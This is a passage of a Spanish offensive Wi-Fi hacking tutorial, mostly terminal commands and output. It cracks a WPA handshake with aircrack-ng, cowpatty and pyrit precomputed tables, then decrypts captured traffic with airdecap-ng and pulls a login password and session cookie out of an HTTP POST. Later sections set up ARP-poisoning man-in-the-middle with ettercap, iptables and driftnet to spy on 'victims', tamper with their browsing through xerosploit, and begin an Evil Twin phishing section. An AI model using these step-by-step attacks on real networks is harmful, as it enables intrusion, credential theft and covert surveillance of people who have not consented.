      Master Key     : B1 42 12 E4 D4 86 FF 87 49 04 29 E3 51 E3 C6 BC 
                       C0 EA A3 03 A6 ED E3 79 A0 A4 BC D6 8F 3B 39 E3 

      Transient Key  : F7 17 BB BB 6F A3 9A E8 D5 DA E6 3E 0E C5 0B 45 
                       C8 D6 47 4B 87 12 FF A7 80 6A 44 00 05 77 CC 96 
                       35 99 2D BA 9D B0 A4 CF C2 43 CF 66 2B 74 D9 16 
                       7C ED 59 EF AE 70 5D 23 D9 7B 9E B9 38 2A 87 CC 

      EAPOL HMAC     : 7F A8 E0 CC 77 49 2C E9 51 8C 81 42 F9 DB CE E0
```

Valores clave:

* 9.415 contraseñas por segundo
* 2 segundos hasta dar con la contraseña

Ahora bien, hagamos uso de aircrack para crackear nuevamente la contraseña, pero esta vez con una sintaxis que
toma como input el fichero creado con **airolib**:

* aircrack-ng -r passwords-airolib Captura-01.cap

Obtenemos los siguientes resultados:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #aircrack-ng -r passwordsAircrack-ng 1.5.2 1.cap

      [00:00:00] 15241/0 keys tested (204456.39 k/s) 

      Time left: 

                           KEY FOUND! [ hottie4u ]


      Master Key     : 24 87 02 AB 54 4E 47 C1 C0 DC DE E9 DF 7D 22 88 
                       80 C4 F0 07 F9 04 B8 71 B7 72 2A F1 04 75 57 99 

      Transient Key  : 21 6C FB DC 6B D0 98 59 99 F1 A3 1A B2 CF 9D 67 
                       E2 6C DA 3C CC 50 B2 60 9B 65 D3 B1 94 DA B4 AB 
                       92 62 DB 80 C5 CB DA 15 A5 04 D3 C7 5B A2 FD 8F 
                       87 36 0A 3A 99 45 14 A2 61 8D 3B 90 44 53 6A A4 

      EAPOL HMAC     : 64 A2 4A 1B D6 22 93 78 78 09 2F 42 7E 11 8F BC 
```

Valores clave:

* 204.456 contraseñas por segundo
* 0.X segundos hasta dar con la contraseña

Lo sé, flipante, pero es que se puede ir aún más rápido.

#### Rainbow Table con Genpmk

Hemos visto cómo podemos aumentar considerablemente la velocidad de cómputo haciendo uso de la suite de
**aircrack**. Ahora distanciémonos un poco de **aircrack** y pensemos en **Cowpatty** y **Pyrit**, no nos
sorprendió mucho la última vez, ¿verdad?, sin embargo, vamos a hacer que tomen un papel más importante.

El fichero **passwords-airolib** no puede ser aprovechado por **Cowpatty** ni por **Pyrit**, en este caso
tendremos que hacer uso de **genpmk** para generar un nuevo diccionario de claves precomputadas adaptado para
que sea interpretado por estas fantásticas herramientas.

La sintaxis es la siguiente:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #genpmk -f diccionario -d dic.genpmk -s hacklab
genpmk 1.3 - WPA-PSK precomputation attack. &lt;jwright@hasborg.com&gt;
File dic.genpmk does not exist, creating.
key no. 1000: skittles1
key no. 2000: princess15
key no. 3000: unfaithful
key no. 4000: andresteamo
key no. 5000: hennessy
key no. 6000: amigasporsiempre
key no. 7000: 0123654789
key no. 8000: trinitron
key no. 9000: flower22
key no. 10000: vincenzo
key no. 11000: pensacola
key no. 12000: boyracer
key no. 13000: grandmom
key no. 14000: battlefield
key no. 15000: badangel
key no. 16000: liferocks
key no. 17000: forever15
key no. 18000: gabriell
key no. 19000: mexico18
key no. 20000: 13031991
key no. 21000: kitty1234
key no. 22000: casper22
key no. 23000: 12021989
key no. 24000: tigers15

24078 passphrases tested in 39.35 seconds:  611.90 passphrases/second
```

Esto lo que ha hecho ha sido generarnos un nuevo diccionario **dic.genpmk** de claves precomputadas. Llegados
a este punto, podemos hacer lo que se describe en los siguientes puntos.

#### Cracking con Cowpatty frente a Rainbow Table

Aprovechando el diccionario **dic.genpmk** generado con **genpmk**, hacemos lo siguiente:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #cowpatty -d dic.genpmk -r Captura-01.cap -s hacklab
cowpatty 4.8 - WPA-PSK dictionary attack. &lt;jwright@hasborg.com&gt;

Collected all necessary data to mount crack against WPA2/PSK passphrase.
Starting dictionary attack.  Please be patient.
key no. 10000: vincenzo

The PSK is &quot;hottie4u&quot;.

15242 passphrases tested in 0.04 seconds:  361013.75 passphrases/second
```

Puntos clave:

* 361.013 contraseñas por segundo
* 0.04 segundos en dar la contraseña

¿Intentamos ir algo más rápido?

#### Cracking con Pyrit frente a Rainbow Table

Aprovechando una vez más el mismo diccionario **dic.genpmk** generado con **genpmk**, hacemos lo siguiente:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pyrit -i dic.genpmk -e hacklab -r Captura-01.cap attack_cowpatty
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'Captura-01.cap' (1/1)...
Parsed 43 packets (43 802.11-packets), got 1 AP(s)

Picked AccessPoint 20:34:fb:b1:c5:53 automatically...
Tried 24078 PMKs so far; 1992708 PMKs per second.

The password is 'hottie4u'.
```

Puntos clave:

* 1.992.708 contraseñas por segundo

Ya en este punto se podría decir que trabajando a unas casi 2 millones de contraseñas por segundo, estaríamos
más que contentos, ¿verdad?, pero es que se puede ir aún más rápido todavía.

#### Cracking con Pyrit a través de ataque por Base de Datos

Este es ya el considerado como el método más potente. Comenzamos importando todas las contraseñas de nuestro
diccionario desde **Pyrit**:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pyrit -i diccionario import_passwords
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Connecting to storage at 'file://'...  connected.
70000 lines read. Flushing buffers.... 
All done.
```

Una vez hecho, especificamos el **ESSID** con el que vamos a trabajar:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pyrit -e hacklab create_essid
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Connecting to storage at 'file://'...  connected.
ESSID already created
```

Por último, generamos las claves precomputadas:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pyrit batch
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Connecting to storage at 'file://'...  connected.
Batchprocessing done.
```

Iniciamos el ataque en modo ataque de base de datos con **Pyrit**:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pyrit -r Captura-01.cap attack_db
Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Connecting to storage at 'file://'...  connected.
Parsing file 'Captura-01.cap' (1/1)...
Parsed 43 packets (43 802.11-packets), got 1 AP(s)

Picked AccessPoint 20:34:fb:b1:c5:53 ('hacklab') automatically.
Attacking handshake with Station 34:41:5d:46:d1:38...
Tried 37326 PMKs so far (100.0%); 18289321 PMKs per second.

The password is 'hottie4u'.
```

Y fijaros que velocidad más vertiginosa:

* **18.289.321 contraseñas por segundo**

### Técnicas de Espionaje

Este punto engloba algunas técnicas básicas **sin entrar en fase de Pentesting** para a nivel de red ser capaces
de saber qué es lo que están haciendo nuestras víctimas, incluido el robo de datos para ciertos casos.

#### Uso de Airdecap para el desencriptado de paquetes

Hasta ahora hemos visto cómo obtener las credenciales de acceso a una red inalámbrica. Ahora bien, ¿qué pasa
una vez estamos dentro?

Está claro que podríamos iniciar con una fase de Pentesting para tratar de vulnerar la seguridad de los
sistemas y comenzar a comprometer todos los equipos, pero no es la idea. Partiremos a nivel de red, viendo
hasta qué punto podemos llegar con la información que hemos recopilado.

Si nos fijamos, las capturas de monitorizado activo que exportamos con ‘airodump-ng’ viajan encriptadas, es
decir, no es posible visualizar consultas HTTP ni peticiones a nivel privado de red:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-01.cap -Y &quot;http.request.method==POST&quot; 2&gt;/dev/null
# Sin resultados
```

¿Por qué?, porque todo lo que estamos capturando es el tráfico externo que recopilamos en modo monitor:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-01.cap 2&gt;/dev/null | head -n 10 
    1   0.000000 AskeyCom_d4:16:78 → Broadcast    802.11 268 Beacon frame, SN=2233, FN=0, Flags=........, BI=100, SSID=MOVISTAR_1677
    2   2.150527 AskeyCom_d4:16:78 → XiaomiCo_b1:c5:53 802.11 341 Probe Response, SN=2255, FN=0, Flags=........, BI=100, SSID=MOVISTAR_1677
    3   2.150557              → AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 10 Acknowledgement, Flags=........
    4   2.165375 AskeyCom_d4:16:78 → XiaomiCo_b1:c5:53 802.11 341 Probe Response, SN=2256, FN=0, Flags=........, BI=100, SSID=MOVISTAR_1677
    5   2.165405              → AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 10 Acknowledgement, Flags=........
    6   2.635968 XiaomiCo_b1:c5:53 → Broadcast    802.11 94 Data, SN=2262, FN=0, Flags=.p....F.
    7   2.941632 XiaomiCo_b1:c5:53 → Broadcast    802.11 94 Data, SN=2266, FN=0, Flags=.p....F.
    8   6.679016 IntelCor_46:d1:38 → AskeyCom_d4:16:77 802.11 110 QoS Data, SN=1512, FN=0, Flags=.p.....T
    9   6.678975              → IntelCor_46:d1:38 (34:41:5d:46:d1:38) (RA) 802.11 10 Acknowledgement, Flags=........
   10   6.681029 AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (TA) → IntelCor_46:d1:38 (34:41:5d:46:d1:38) (RA) 802.11 16 Request-to-send, Flags=........
```

No podemos ver desde aquí ningún tipo de consulta HTTP o tráfico interno. 

Entonces bien, ¿qué hacemos?, vamos a usar la cabeza por unos momentos. ¿Qué es lo que hace que los paquetes
que capturemos estén encriptados y no podamos ver el tráfico privado?, la propia contraseña de la red, ¿no?,
¿y qué pasa si la tenemos?, ¿no se supone que deberíamos ser capaces entonces de desencriptar estos paquetes?,
correcto.

A través de la herramienta **airdecap-ng** de la suite de **aircrack**, es posible desencriptar estas capturas
siempre y cuando se proporcione la contraseña de la red correcta.

Lo hacemos de la siguiente manera:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ls
Captura-01.cap
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #airdecap-ng -e MOVISTAR_1677 -p XXXXXXXXXXXXXXXXXXXX Captura-01.cap 
Total number of stations seen            9
Total number of packets read          2838
Total number of WEP data packets         0
Total number of WPA data packets      1082
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets       189
Number of bad TKIP (WPA) packets         0
Number of bad CCMP (WPA) packets         0
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #
```

Si nos fijamos, se han desencriptado un total de 189 paquetes WPA. Esto es así debido a que la contraseña
proporcionada es la correcta, si hubiera puesto una que no fuera correcta no se habría desencriptado nada.

Esto nos genera en el directorio actual de trabajo un nuevo fichero:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ls
Captura-01.cap  Captura-01-dec.cap
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #
```

Sobre el cual podremos hacer los filtrados para visualizar el tráfico interno.

#### Análisis del desencriptado con Tshark y Wireshark

Realmente usaré **Tshark**, pero desde **Wireshark** obtendríamos los mismos resultados. Intentemos ver ahora
si somos capaces de visualizar tráfico HTTP, concretamente, alguna petición POST que se haya realizado:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-01-dec.cap -Y &quot;http.request.method==POST&quot; 2&gt;/dev/null
  185  10.456181 192.168.1.55 → 46.231.127.84 HTTP 736 POST /includes/posthandler.php HTTP/1.1  (application/x-www-form-urlencoded)
```

Interesante, vemos algo. Intentemos ver si somos capaces de visualizar el payload de esta petición:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-01-dec.cap -Y &quot;http.request.method==POST&quot; -Tfields -e tcp.payload 2&gt;/dev/null
50:4f:53:54:20:2f:69:6e:63:6c:75:64:65:73:2f:70:6f:73:74:68:61:6e:64:6c:65:72:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:31:30:35:0d:0a:41:63:63:65:70:74:3a:20:2a:2f:2a:0d:0a:58:2d:52:65:71:75:65:73:74:65:64:2d:57:69:74:68:3a:20:58:4d:4c:48:74:74:70:52:65:71:75:65:73:74:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:4d:6f:7a:69:6c:6c:61:2f:35:2e:30:20:28:58:31:31:3b:20:4c:69:6e:75:78:20:78:38:36:5f:36:34:29:20:41:70:70:6c:65:57:65:62:4b:69:74:2f:35:33:37:2e:33:36:20:28:4b:48:54:4d:4c:2c:20:6c:69:6b:65:20:47:65:63:6b:6f:29:20:43:68:72:6f:6d:65:2f:37:36:2e:30:2e:33:38:30:39:2e:38:37:20:53:61:66:61:72:69:2f:35:33:37:2e:33:36:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:77:77:77:2d:66:6f:72:6d:2d:75:72:6c:65:6e:63:6f:64:65:64:3b:20:63:68:61:72:73:65:74:3d:55:54:46:2d:38:0d:0a:4f:72:69:67:69:6e:3a:20:68:74:74:70:3a:2f:2f:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:0d:0a:52:65:66:65:72:65:72:3a:20:68:74:74:70:3a:2f:2f:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:2f:6c:6f:67:69:6e:2e:70:68:70:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:0d:0a:41:63:63:65:70:74:2d:4c:61:6e:67:75:61:67:65:3a:20:65:73:2d:45:53:2c:65:73:3b:71:3d:30:2e:39:2c:65:6e:3b:71:3d:30:2e:38:2c:6a:61:3b:71:3d:30:2e:37:0d:0a:43:6f:6f:6b:69:65:3a:20:50:48:50:53:45:53:53:49:44:3d:65:32:64:36:30:65:65:37:63:37:63:65:34:32:64:34:65:39:37:31:37:30:33:65:37:62:38:38:35:34:36:34:0d:0a:0d:0a:75:73:65:72:6e:61:6d:65:3d:73:34:76:69:74:61:72:26:70:61:73:73:77:6f:72:64:3d:6d:69:50:61:73:73:77:6f:72:64:49:6d:70:6f:73:69:62:6c:65:64:65:4f:62:74:65:6e:65:72:26:74:6f:6b:65:6e:3d:66:34:35:65:36:32:30:61:62:33:64:34:63:62:30:30:61:35:34:33:66:37:33:37:37:64:34:30:61:63:63:65:26:6c:6f:67:69:6e:3d:4c:6f:67:69:6e
```

¡Perfecto!, está en hexadecimal, pasémoslo a un formato algo más legible y veamos si podemos sacar algún dato
en claro:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-01-dec.cap -Y &quot;http.request.method==POST&quot; -Tfields -e tcp.payload 2&gt;/dev/null | xxd -ps -r; echo
POST /includes/posthandler.php HTTP/1.1
Host: www.alcanzatumeta.es
Connection: keep-alive
Content-Length: 105
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://www.alcanzatumeta.es
Referer: http://www.alcanzatumeta.es/login.php
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9,en;q=0.8,ja;q=0.7
Cookie: PHPSESSID=e2d60ee7c7ce42d4e971703e7b885464

username=s4vitar&amp;password=miPasswordImposibledeObtener&amp;token=f45e620ab3d4cb00a543f7377d40acce&amp;login=Login
```

Estupendo, como vemos, usuario y contraseña:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -r Captura-01-dec.cap -Y &quot;http.request.method==POST&quot; -Tfields -e tcp.payload 2&gt;/dev/null | xxd -ps -r | tail -n 1 | cut -d '&amp;' -f 1-2 | tr '&amp;' '\n'
username=s4vitar
password=miPasswordImposibledeObtener
```

La elegancia de todo esto está en que no estamos haciendo un **MITM** tradicional estando asociados en la red,
lo cual puede levantar sospechas dado que la mayoría de ataques de tipo ARP Spoofing/DNS Spoofing ya son
detectados y alertados por la mayoría de navegadores.

Este ataque lo estamos haciendo desde fuera de la red, sin estar asociados, capturando simplemente el tráfico
que percibamos estando en modo monitor, lo cual es fascinante.

**IMPORTANTE**: Para desencriptar el tráfico de un cliente, es necesario capturar un Handshake por parte de
dicha estación. En caso contrario, no será posible desencriptar su tráfico.

#### Espionaje con Ettercap Driftnet y enrutamiento con iptables

Considerando que ya estamos conectados a la red y queremos actuar de manera activa, no pasiva como se vio en
el punto anterior, lo primero que debemos hacer es habilitar el enrutamiento en nuestro equipo:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #echo 1 &gt; /proc/sys/net/ipv4/ip_forward
┌─[root@parrot]─[/home/s4vitar]
└──╼ #
```

Una vez hecho, generamos una pequeña regla en **iptables** para definir cómo se debe de comportar el tráfico a
la hora de envenenar la red. Para este caso, queremos que todo el tráfico dirigido al puerto 80 sea enrutado
al puerto 8080:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
┌─[root@parrot]─[/home/s4vitar]
└──╼ #
```

Antes que nada recomiendo limpiar cualquier tipo de regla previa definida en iptables. Para al que le guste la
idea, en mi caso tengo creado un alias a nivel de **bashrc**:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #cat ~/.bashrc | grep flushIPTABLES -A 5
function flushIPTABLES(){
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
}
```

Así cuando escribo **flushIPTABLES** se me limpian todas las reglas previamente definidas.

Posteriormente, retocamos el fichero **/etc/ettercap/etter.conf**, cambiando los valores por defecto a **0**:

```bash
[privs]
ec_uid = 0                # nobody is the default
ec_gid = 0                # nobody is the default
```

Por otro lado, descomentamos estas 2 líneas de dicho archivo:

```bash
# if you use iptables:
   redir_command_on = &quot;iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport&quot;
   redir_command_off = &quot;iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport&quot;
```

Una vez hecho, abrimos **Ettercap** en modo gráfico a través del parámetro '**-G**'. Lo primero que haremos
será escanear los Hosts disponibles en la red:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WaBf.png&quot;&gt;

Esto se puede hacer de manera intuitiva a través de la pestaña **Hosts**. Una vez hecho, y este paso es
importante, lo que haremos será seleccionar en primer lugar nuestro Gateway (192.168.1.1) y presionar en **Add
to Target 1**, seguidamente seleccionamos la dirección IP de nuestra víctima y presionamos en **Add To Target
2**:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WaBr.png&quot;&gt;

Ya con este esquema configurado, verificamos desde la pestaña **Targets** que todo esté como debe estar:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WaBz.png&quot;&gt;

Si es así, continuamos. Nos iremos a la pestaña **Mitm** y pincharemos en **ARP Poissoning**. Acto seguido, se
nos abrirá una ventana, en ella seleccionamos la casilla **Sniff Remote Connections** y presionamos en **Aceptar**.

Tras hacer esto, deberíamos ver lo siguiente desde la ventana principal:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WaBF.png&quot;&gt;

Ahora toca hacer la prueba de fuego. Cargamos los siguientes comandos desde consola:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WaBJ.png&quot;&gt;

Una vez estos están corriendo, simulamos la navegación desde el dispositivo cuyo tráfico se está envenenando.

En este caso, se accede a una dirección URL de noticias, obteniendo los siguientes resultados:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WaBL.png&quot;&gt;

Cabe decir que a su vez estamos usando **driftnet**, razón por la que además de visualizar la dirección URL
que se está visitando, somos capaces de ver las imágenes que cargan a tiempo real en dicha página web. 

Si le damos un tiempo, conseguiremos extraer incluso más imágenes aún:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WaBN.png&quot;&gt;

A su vez, podemos aprovechar el propio **Ettercap** para capturar credenciales de autenticación a una página
web:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WaC1.png&quot;&gt;

### Ataques graciosos

Estos ataques forman parte de una categoría que considero algo Off-Topic, porque no obtenemos nada de interés
con ello.. pero bueno, puede servir para echarnos unas risas de vez en cuando.

#### Reemplazado de imágenes web

En este punto, lo que haremos será envenenar el tráfico de nuestra víctima una vez más pero esta vez para
manipular las imágenes que se disponen en las páginas web a las que accede.

Para ello, previamente necesitamos contar con una imagen, la cual utilizaremos para hacer la sustitución. Por
otro lado, necesitamos tener instalada la herramienta **Xerosploit** en nuestro equipo.

* **Repositorio**: https://github.com/LionSec/xerosploit

Una vez la tengamos instalada, ejecutamos **xerosploit** desde consola:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #xerosploit 

____  __                     ________         ______       _____ _____ 
__  |/ /_____ ______________ __  ___/________ ___  /______ ___(_)__  /_
__    / _  _ \__  ___/_  __ \_____ \ ___  __ \__  / _  __ \__  / _  __/
_    |  /  __/_  /    / /_/ /____/ / __  /_/ /_  /  / /_/ /_  /  / /_  
/_/|_|  \___/ /_/     \____/ /____/  _  .___/ /_/   \____/ /_/   \__/  
                                     /_/                                    


[+]═══════════[ Author : @LionSec1 _-\|/-_ Website: lionsec.net ]═══════════[+]

                      [ Powered by Bettercap and Nmap ]
 
┌═════════════════════════════════════════════════════════════════════════════┐
█                                                                             █
█                         Your Network Configuration                          █ 
█                                                                             █
└═════════════════════════════════════════════════════════════════════════════┘     
 
╒══════════════╤═══════════════════╤═════════════╤═════════╤════════════╕
│  IP Address  │    MAC Address    │   Gateway   │  Iface  │  Hostname  │
╞══════════════╪═══════════════════╪═════════════╪═════════╪════════════╡
├──────────────┼───────────────────┼─────────────┼─────────┼────────────┤
│ 192.168.1.43 │ 80:CE:62:3C:EB:A1 │ 192.168.1.1 │  eth0   │   parrot   │
╘══════════════╧═══════════════════╧═════════════╧═════════╧════════════╛

╔═════════════╦════════════════════════════════════════════════════════════════════╗
║             ║ XeroSploit is a penetration testing toolkit whose goal is to       ║
║ Information ║ perform man in the middle attacks for testing purposes.            ║
║             ║ It brings various modules that allow to realise efficient attacks. ║
║             ║ This tool is Powered by Bettercap and Nmap.                        ║
╚═════════════╩════════════════════════════════════════════════════════════════════╝

[+] Please type 'help' to view commands.

Xero ➮ 
```

Con el comando **help**, listamos las opciones disponibles:

```bash
Xero ➮ help  

╔══════════╦════════════════════════════════════════════════════════════════╗
║          ║                                                                ║
║          ║ scan     :  Map your network.                                  ║
║          ║                                                                ║
║          ║ iface    :  Manually set your network interface.               ║
║ COMMANDS ║                                                                ║
║          ║ gateway  :  Manually set your gateway.                         ║
║          ║                                                                ║
║          ║ start    :  Skip scan and directly set your target IP address. ║
║          ║                                                                ║
║          ║ rmlog    :  Delete all xerosploit logs.                        ║
║          ║                                                                ║
║          ║ help     :  Display this help message.                         ║
║          ║                                                                ║
║          ║ exit     :  Close Xerosploit.                                  ║
║          ║                                                                ║
╚══════════╩════════════════════════════════════════════════════════════════╝

[+] Please type 'help' to view commands.

Xero ➮ 
```

Lo primero es realizar un escaneo de la red, por lo que corremos la opción **scan**:

```bash
Xero ➮ scan

[++] Mapping your network ... 

[+]═══════════[ Devices found on your network ]═══════════[+]

╔═══════════════╦═══════════════════╦═══════════════╗
║ IP Address    ║ Mac Address       ║ Manufacturer  ║
╠═══════════════╬═══════════════════╬═══════════════╣
║ 192.168.1.1   ║ 1C:B0:44:D4:16:77 ║ (Unknown)     ║
║ 192.168.1.55  ║ 34:41:5D:46:D1:38 ║ (Unknown)     ║
║ 192.168.1.60  ║ 20:34:FB:B1:C5:53 ║ (Unknown)     ║
║ 192.168.1.201 ║ F8:8B:37:E3:32:A2 ║ (Unknown)     ║
║ 192.168.1.43  ║ 80:CE:62:3C:EB:A1 ║ (This device) ║
║               ║                   ║               ║
╚═══════════════╩═══════════════════╩═══════════════╝

[+] Please choose a target (e.g. 192.168.1.10). Enter 'help' for more information.

Xero ➮ 
```

Tras identificar a nuestra víctima, escribimos la dirección IP y se nos listarán los distintos modos de ataque:

```bash
Xero ➮ 192.168.1.60

[++] 192.168.1.60 has been targeted. 

[+] Which module do you want to load ? Enter 'help' for more information.

Xero»modules ➮ help

╔═════════╦══════════════════════════════════════════════════════════════════════╗
║         ║                                                                      ║
║         ║ pscan       :  Port Scanner                                          ║
║         ║                                                                      ║
║         ║ dos         :  DoS Attack                                            ║
║         ║                                                                      ║
║         ║ ping        :  Ping Request                                          ║
║         ║                                                                      ║
║         ║ injecthtml  :  Inject Html code                                      ║
║         ║                                                                      ║
║         ║ injectjs    :  Inject Javascript code                                ║
║         ║                                                                      ║
║         ║ rdownload   :  Replace files being downloaded                        ║
║         ║                                                                      ║
║         ║ sniff       :  Capturing information inside network packets          ║
║ MODULES ║                                                                      ║
║         ║ dspoof      :  Redirect all the http traffic to the specified one IP ║
║         ║                                                                      ║
║         ║ yplay       :  Play background sound in target browser               ║
║         ║                                                                      ║
║         ║ replace     :  Replace all web pages images with your own one        ║
║         ║                                                                      ║
║         ║ driftnet    :  View all images requested by your targets             ║
║         ║                                                                      ║
║         ║ move        :  Shaking Web Browser content                           ║
║         ║                                                                      ║
║         ║ deface      :  Overwrite all web pages with your HTML code           ║
║         ║                                                                      ║
╚═════════╩══════════════════════════════════════════════════════════════════════╝

[+] Which module do you want to load ? Enter 'help' for more information.

Xero»modules ➮ 
```

Entre ellos, seleccionaremos la opción **replace**, que se encargará de llevar a cabo la sustitución de
imágenes sobre la página web que nuestra víctima esté visitando:

```bash
Xero»modules ➮ replace
 
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                          Image Replace                       █
█                                                              █
█        Replace all web pages images with your own one        █
└══════════════════════════════════════════════════════════════┘     

[+] Enter 'run' to execute the 'replace' command.

Xero»modules»replace ➮ run

[+] Insert your image path. (e.g. /home/capitansalami/pictures/fun.png)

Xero»modules»replace ➮ 
```

Especificamos la ruta absoluta de nuestra imagen y comenzará el ataque. Desde que la víctima navegue a una
página web, todas las imágenes serán sustituidas por la nuestra:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2Wbs4.png&quot;&gt;

#### Ataque Shaking Web

Haciendo uso de la misma herramienta vista en el punto anterior, otra de las acciones de las que dispone
**xerosploit** es el **move**, por el cual podemos hacer un ataque de tipo **Shaking Web**, es decir, hacer
que cuando nuestra víctima navegue a una página, esta se mueva temblando de manera que no se logra leer nada
de la misma:

```bash
Xero ➮ 192.168.1.60

[++] 192.168.1.60 has been targeted. 

[+] Which module do you want to load ? Enter 'help' for more information.

Xero»modules ➮ help

╔═════════╦══════════════════════════════════════════════════════════════════════╗
║         ║                                                                      ║
║         ║ pscan       :  Port Scanner                                          ║
║         ║                                                                      ║
║         ║ dos         :  DoS Attack                                            ║
║         ║                                                                      ║
║         ║ ping        :  Ping Request                                          ║
║         ║                                                                      ║
║         ║ injecthtml  :  Inject Html code                                      ║
║         ║                                                                      ║
║         ║ injectjs    :  Inject Javascript code                                ║
║         ║                                                                      ║
║         ║ rdownload   :  Replace files being downloaded                        ║
║         ║                                                                      ║
║         ║ sniff       :  Capturing information inside network packets          ║
║ MODULES ║                                                                      ║
║         ║ dspoof      :  Redirect all the http traffic to the specified one IP ║
║         ║                                                                      ║
║         ║ yplay       :  Play background sound in target browser               ║
║         ║                                                                      ║
║         ║ replace     :  Replace all web pages images with your own one        ║
║         ║                                                                      ║
║         ║ driftnet    :  View all images requested by your targets             ║
║         ║                                                                      ║
║         ║ move        :  Shaking Web Browser content                           ║
║         ║                                                                      ║
║         ║ deface      :  Overwrite all web pages with your HTML code           ║
║         ║                                                                      ║
╚═════════╩══════════════════════════════════════════════════════════════════════╝

[+] Which module do you want to load ? Enter 'help' for more information.

Xero»modules ➮ move
```

### Evil Twin Attack

En este punto, veremos una de las técnicas más comunes para obtener la contraseña de una red inalámbrica
ajena, por medio de técnicas Phishing aplicadas sobre WiFi.

Si has leído todo lo anterior hasta este punto, habrás visto como es muy común que las estaciones emitan el
paquete **Probe Request** cuando estas no están asociadas a ningún AP:

```bash
┌─[root@parrot]─[/home/s4vitar]
└──╼ #tshark -i wlan0mon -Y &quot;wlan.fc.type_subtype==4&quot; 2&gt;/dev/null
    1 0.000000000 Apple_7d:1f:e9 → Broadcast    802.11 195 Probe Request, SN=1063, FN=0, Flags=........C, SSID=MOVISTAR_PLUS_2A51
